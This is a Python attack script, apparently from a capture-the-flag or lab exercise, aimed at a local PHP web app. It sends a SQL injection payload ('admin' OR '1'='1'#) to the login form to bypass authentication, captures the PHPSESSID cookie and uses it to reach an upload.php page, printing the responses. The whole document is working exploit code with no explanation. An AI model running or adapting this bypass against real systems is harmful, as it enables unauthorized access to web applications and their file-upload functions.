import requests
from bs4 import BeautifulSoup
import re

# Step 1: SQL injection authentication bypass
login_url = "http://127.0.0.1:33210/index.php"
username_payload = "admin' OR '1'='1'#"
login_data = {
    "username": username_payload,
    "password": "dummy123",
    "submit": "Submit"
}

print("=== STEP 1: SQL INJECTION BYPASS ===")
print(f"[*] POST {login_url}")
print(f"[*] Username payload: {username_payload}")
print(f"[*] Data: {login_data}\n")

session = requests.Session()
response = session.post(login_url, data=login_data, allow_redirects=True)

phpsessid = None
if 'Set-Cookie' in response.headers or session.cookies:
    cookies = session.cookies
    if 'PHPSESSID' in cookies:
        phpsessid = cookies['PHPSESSID']
        print(f"[+] PHPSESSID from session: {phpsessid}")
    else:
        print(f"[-] PHPSESSID not in session cookies")
        print(f"[!] Session cookies: {dict(cookies)}")
    
    print(f"[+] Login response status: {response.status_code}")
    print(f"[+] All headers: {dict(response.headers)}")
    print(f"[+] Redirects: {len(response.history)}")
    for idx, redirect in enumerate(response.history, 1):
        print(f"    Redirect {idx}: {redirect.status_code} -> {redirect.url}")
else:
    print(f"[-] No cookies received")
    print(f"[!] Status: {response.status_code}")
    print(f"[!] Response preview:\n{response.text[:500]}")

if not phpsessid:
    print("[-] Authentication bypass failed - no valid session")
    exit()

# Step 2: Access upload.php with authenticated session
upload_url = "http://127.0.0.1:33210/upload.php"
cookies = {'PHPSESSID': phpsessid}

print(f"\n=== STEP 2: ACCESS UPLOAD.PHP ===")
print(f"[*] GET {upload_url}")
print(f"[*] Using PHPSESSID: {phpsessid}\n")

# Clear session and use explicit cookies
session2 = requests.Session()
upload_response = session2.get(upload_url, cookies=cookies, allow_redirects=True)

print(f"[+] Upload page status: {upload_response.status_code}")
print(f"[+] All headers: {dict(upload_response.headers)}")
print(f"[+] Redirects: {len(upload_response.history)}")
for idx, redirect in enumerate(upload_response.history, 1):
    print(f"    Redirect {idx}: {redirect.status_code} -> {redirect.url}")
print(f"[+] Final URL: {upload_response.url}")

soup = BeautifulSoup(upload_response.text, 'html.parser')
print(f"[+] Page title: {soup.title.string if soup.title else 'No title'}")

# Check if we got redirected to login
if 'login' in upload_response.url.lower() or 'index' in upload_response.url.lower():
    print(f"\n[!] WARNING: Redirected to login/index page - session may not be valid")
    print(f"[!] Final URL: {upload_response.url}")

# Print full response to debug
print(f"\n=== FULL RESPONSE BODY ===")
print(upload_response.text)

# Try accessing other pages to test session validity
test_urls = [
    "http://127.0.0.1:33210/",
    "http://127.0.0.1:33210/index.php"
]

print(f"\n=== TESTING SESSION VALIDITY ===")
for test_url in test_urls:
    test_response = session2.get(test_url, cookies=cookies)
    print(f"\n[*] Testing: {test_url}")
    print(f"[+] Status: {test_response.status_code}")
    print(f"[+] Final URL: {test_response.url}")
    if 'login' in test_response.url:
        print(f"[+] Redirected to login - session not authenticated")
    else:
        print(f"[+] No redirect - session appears authenticated")

